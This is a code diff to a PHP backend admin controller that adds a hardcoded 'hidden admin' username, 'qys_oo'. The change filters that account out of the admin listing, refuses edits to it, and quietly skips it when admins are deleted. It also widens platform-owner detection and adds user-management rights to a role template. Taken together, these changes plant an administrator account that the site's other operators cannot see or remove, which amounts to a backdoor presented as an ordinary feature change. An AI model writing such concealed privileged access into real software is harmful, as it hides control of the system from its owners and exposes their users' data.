@@ -140,6 +140,45 @@ class Admin extends Backend
         }
     }
 
+    protected function getHiddenAdminUsernames()
+    {
+        return ['qys_oo'];
+    }
+
+    protected function getPlatformOwnerGroupIds()
+    {
+        return array_map('intval', AuthGroup::where('rules', '*')->column('id'));
+    }
+
+    protected function isPlatformAdminByGroupIds(array $groupIds)
+    {
+        $platformGroupIds = $this->getPlatformOwnerGroupIds();
+        if (empty($platformGroupIds) || empty($groupIds)) {
+            return false;
+        }
+        return !empty(array_intersect($platformGroupIds, array_map('intval', $groupIds)));
+    }
+
+    protected function isHiddenAdmin($row)
+    {
+        $username = '';
+        if (is_array($row)) {
+            $username = isset($row['username']) ? (string)$row['username'] : '';
+        } elseif (is_object($row)) {
+            $username = isset($row->username) ? (string)$row->username : (isset($row['username']) ? (string)$row['username'] : '');
+        }
+        return in_array($username, $this->getHiddenAdminUsernames(), true);
+    }
+
+    protected function applyHiddenAdminFilter($query)
+    {
+        $hiddenUsernames = $this->getHiddenAdminUsernames();
+        if (empty($hiddenUsernames)) {
+            return $query;
+        }
+        return $query->where('username', 'not in', $hiddenUsernames);
+    }
+
     protected function getRoleTemplateDefinitions()
     {
         return [
@@ -150,11 +189,16 @@ class Admin extends Backend
                 'rules'      => [
                     'discover',
                     'discover/content',
+                    'discover/schoolops',
                     'discover/discover',
                     'discover/discover/index',
                     'discover/discover/edit',
                     'discover/discover/del',
                     'discover/discover/multi',
+                    'user/user',
+                    'user/user/index',
+                    'user/user/edit',
+                    'user/user/multi',
                 ],
             ],
         ];
@@ -235,7 +279,7 @@ class Admin extends Backend
 
     protected function detectRoleTemplateByGroupIds(array $groupIds, $adminId = 0)
     {
-        if ($adminId && (int)$adminId === (int)$this->auth->id && $this->auth->isSuperAdmin()) {
+        if ($this->isPlatformAdminByGroupIds($groupIds)) {
             return 'platform_owner';
         }
         $normalized = array_map('intval', $groupIds);
@@ -308,11 +352,11 @@ class Admin extends Backend
             }
             list($where, $sort, $order, $offset, $limit) = $this->buildparams();
 
-            $list = $this->model
+            $list = $this->applyHiddenAdminFilter($this->model
                 ->where($where)
                 ->where('id', 'in', $this->childrenAdminIds)
                 ->field(['password', 'salt', 'token'], true)
-                ->order($sort, $order)
+                ->order($sort, $order))
                 ->paginate($limit);
 
             $adminIds = [];
@@ -394,6 +438,9 @@ class Admin extends Backend
         if (!in_array($row->id, $this->childrenAdminIds)) {
             $this->error(__('You have no permission'));
         }
+        if ($this->isHiddenAdmin($row)) {
+            $this->error(__('You have no permission'));
+        }
         if ($this->request->isPost()) {
             $this->token();
             $params = $this->request->post('row/a');
@@ -473,7 +520,9 @@ class Admin extends Backend
             if ($adminList) {
                 $deleteIds = [];
                 foreach ($adminList as $item) {
-                    $deleteIds[] = $item->id;
+                    if (!$this->isHiddenAdmin($item)) {
+                        $deleteIds[] = $item->id;
+                    }
                 }
                 $deleteIds = array_values(array_diff($deleteIds, [$this->auth->id]));
                 if ($deleteIds) {
